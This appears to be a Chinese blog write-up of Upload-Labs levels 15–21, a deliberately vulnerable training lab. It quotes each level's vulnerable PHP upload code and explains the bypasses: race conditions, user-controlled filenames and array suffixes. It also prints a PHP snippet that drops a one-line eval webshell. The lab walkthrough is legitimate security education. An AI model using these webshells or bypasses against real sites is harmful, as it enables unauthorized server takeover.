---
title: "文件上传靶场 Upload-Labs 通关笔记（Pass-15 ~ Pass-21）"
date: 2026-08-17 12:00:00 +0800
categories: [Web安全, 文件上传漏洞]
tags: [upload-labs, 文件上传, 漏洞复现, webshell, 靶场]
excerpt: "Upload-Labs 第十五到二十一关：exif 图片校验、二次渲染、条件竞争、自定义上传类与数组后缀绕过的高阶打法。"
---

## Pass-15 图片马 + 文件包含（同 Pass-14）

步骤与第14关一样，贴图如下
![Pasted image 20260817224223](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817224223.png)

![Pasted image 20260817224631](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817224631.png)
![Pasted image 20260817224644](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817224644.png)

## Pass-16 exif_imagetype 图片类型校验绕过

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

第16关同14，15关思路一样，操作一样。但是需要打开php_exif，
![Pasted image 20260817225142](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817225142.png)

exif_imagetype() 读取一个图像的第一个字节并检查其签名。
本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 `$_SERVER['HTTP_ACCEPT']` 结合使用来检查浏览器是否可以显示某个指定的图像。

通过过程参考14，15关。

## Pass-17 二次渲染绕过

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

看一下源码，这里是对图片进行了二次渲染的
所以我们可以对比原图和被二次渲染过的图片，哪些地方没有被改变，然后把php代码放在这个位置，再次上传就可以绕过，最后配合文件包含漏洞就可以了
这里可以使用HxD Hex Editor进行比较
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818230759.png)
具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的，知道怎么解就可以了。

## Pass-18 条件竞争绕过

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

审计代码发现，这一关卡是一个**条件竞争**，代码中先将图片上传上去，才开始进行判断后缀名、二次渲染，所以我们在将文件上传上去的一瞬间进行访问，那代码就不能对文件执行后续操作了，但是就算当时打开了文件，在连接蚁剑的时候，也必然会被删除掉文件。

所以，在这里我们要改思路，不能再继续写一句话木马，而是要写成：
```php
<?php
file_put_contents("shell.php",'<?php eval($_REQUEST[123]);?>');
?>
```
利用file_put_contents的写入文件模式，也就是争取未被源码删除之前的时间，往根目录写入另一份一句话木马文件，到时候直接包含这份新的一句话木马文件即可。

这里就需要burpsuit抓包，扔进intruder，然后跑一个Null payloads：
![Pasted image 20260817233857](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817233857.png)

然后发包，用另一个浏览器一直访问18.php地址，只要在上传的一瞬间，他还没结束以及删除就可以了。
![Pasted image 20260817234214](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817234214.png)

只要生成了shell.php，就算操作成功了
![Pasted image 20260817234251](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817234251.png)

然后我们访问这个文件就行了，也可以连接蚁剑
![Pasted image 20260817234559](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817234559.png)
![Pasted image 20260817234659](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817234659.png)
![Pasted image 20260817234713](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260817234713.png)

## Pass-19 图片马 + 文件包含（自定义上传类）

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}
```

```php
//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

代码里面检查了后缀名，然后上传，最后更改了文件名
这一关直接使用图片马，配合文件包含漏洞就能通关
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818175300.png)

访问http://upload:8012/include.php?file=upload1787046724.png
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818175350.png)

连接冰蝎
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818175447.png)
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818175455.png)

## Pass-20 文件名可控 + 黑名单绕过

```php
// 初始化上传标记，false代表上传未成功
$is_upload = false;
// 初始化消息变量，用于存放提示信息
$msg = null;
// 判断是否POST提交了submit参数，也就是是否点击上传提交按钮
if (isset($_POST['submit'])) {
    // 判断上传目录常量UPLOAD_PATH对应的文件夹是否存在
    if (file_exists(UPLOAD_PATH)) {
        // 定义禁止的后缀黑名单数组，拦截php/jsp/asp等可执行脚本后缀
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        // 从POST获取save_name，目标保存文件名，用户可控，漏洞关键点
        $file_name = $_POST['save_name'];
        // pathinfo获取用户传入save_name的文件扩展名，只看目标保存名，不看原始上传文件名
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        // 判断解析出的后缀不在黑名单中，则允许上传
        if(!in_array($file_ext,$deny_ext)) {
            // 获取上传文件在服务器上的临时文件路径
            $temp_file = $_FILES['upload_file']['tmp_name'];
            // 拼接完整保存路径：上传目录 + / + 用户可控的文件名
            $img_path = UPLOAD_PATH . '/' .$file_name;
            // 将临时文件移动到目标路径，完成文件保存
            if (move_uploaded_file($temp_file, $img_path)) { 
                // 移动成功，标记上传成功
                $is_upload = true;
            }else{
                // 文件移动失败，赋值错误提示
                $msg = '上传出错！';
            }
        }else{
            // 后缀命中黑名单，提示禁止该文件类型
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        // 上传文件夹不存在，输出提示需要手动创建
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```


这一关有点过于简单了，代码中文件名是用户可控的，黑名单校验的也是用户可控的文件名
直接构造数据包如下
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818215023.png)

连接蚁剑
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818214942.png)
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818215324.png)

## Pass-21 数组后缀 + MIME 白名单绕过

```php
// 上传成功标记，初始false失败
$is_upload = false;
// 提示消息
$msg = null;
// 判断是否有上传文件，$_FILES不为空
if(!empty($_FILES['upload_file'])){
    // 定义允许的MIME类型数组
    $allow_type = array('image/jpeg','image/png','image/gif');
    // 取上传文件的MIME（来自浏览器请求头Content‑Type）做比对
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        // 三元运算符：如果POST的save_name为空就用原始上传文件名；不为空就用用户可控的save_name
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        // 如果不是数组，就把文件名按小数点分割转成数组，全部转小写
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
        // end()取数组最后一个元素，拿到扩展名
        $ext = end($file);
        // 允许后缀白名单 jpg png gif
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            // reset取数组第一个元素 + . +数组最后一项，拼接文件名
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            // 获取临时文件路径
            $temp_file = $_FILES['upload_file']['tmp_name'];
            // 拼接保存路径
            $img_path = UPLOAD_PATH . '/' .$file_name;
            //移动临时文件完成上传
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

这一关还是文件名用户可控啊，跟上一关逻辑一样啊
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818221455.png)

连接冰蝎
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818221316.png)

但是按照代码的逻辑，应该是想让我们使用多后缀绕过
这里我们也可以将文件名以数组的方式发过去，如下
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818221907.png)

访问一下，也是成功getshell
![](/assets/img/posts/upload-labs-pass-15-21/pasted-image-20260818222354.png)
